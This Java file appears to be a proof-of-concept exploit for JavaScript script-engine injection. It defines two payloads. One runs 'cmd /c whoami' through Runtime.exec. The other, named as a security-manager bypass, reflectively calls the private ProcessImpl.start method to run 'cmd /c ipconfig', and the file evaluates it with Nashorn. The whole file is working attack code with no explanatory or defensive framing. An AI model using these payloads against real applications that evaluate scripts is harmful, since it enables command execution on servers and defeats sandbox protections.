import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;

public class main {
    public static void main(String[] args) throws Exception {
        String poc1 = "var s = [3];\n" +
                "s[0] = \"cmd\";\n" +
                "s[1] = \"/c\";\n" +
                "s[2] = \"whoami\";" +
                "var p = java.lang.Runtime.getRuntime().exec(s);\n" +
                "var sc = new java.util.Scanner(p.getInputStream(),\"GBK\").useDelimiter(\"\\\\A\");\n" +
                "var result = sc.hasNext() ? sc.next() : \"\";\n" +
                "print(result);sc.close();";

        String bypass_sm_exp = "var str = Java.type('java.lang.String[]').class;" +
                "var map = Java.type('java.util.Map').class;" +
                "var string = Java.type('java.lang.String').class;" +
                "var Redirect = Java.type('java.lang.ProcessBuilder.Redirect[]').class;" +
                "var boolean = Java.type('boolean').class;" +
                "var c = java.lang.Class.forName('java.lang.ProcessImpl');" +
                "var start = c.getDeclaredMethod('start',str,map,string,Redirect,boolean);" +
                "start.setAccessible(true);" +
                "var anArray = [\"cmd\", \"/c\", \"ipconfig\"];" +
                "var cmd = Java.to(anArray, Java.type(\"java.lang.String[]\"));" +
                "var input = start.invoke(null,cmd,null,null,null,false).getInputStream();" +
                "var reader = new java.io.BufferedReader(new java.io.InputStreamReader(input));" +
                "var stringBuilder = new java.lang.StringBuilder();" +
                "var line = null;" +
                "while((line = reader.readLine())!=null){" +
                "stringBuilder.append(line);" +
                "stringBuilder.append('\\r\\n');"+
                "}" +
                "stringBuilder.toString();" +
                "print(stringBuilder)";
        ScriptEngine engine = new ScriptEngineManager().getEngineByExtension("js");
        engine.eval(bypass_sm_exp);
    }

}
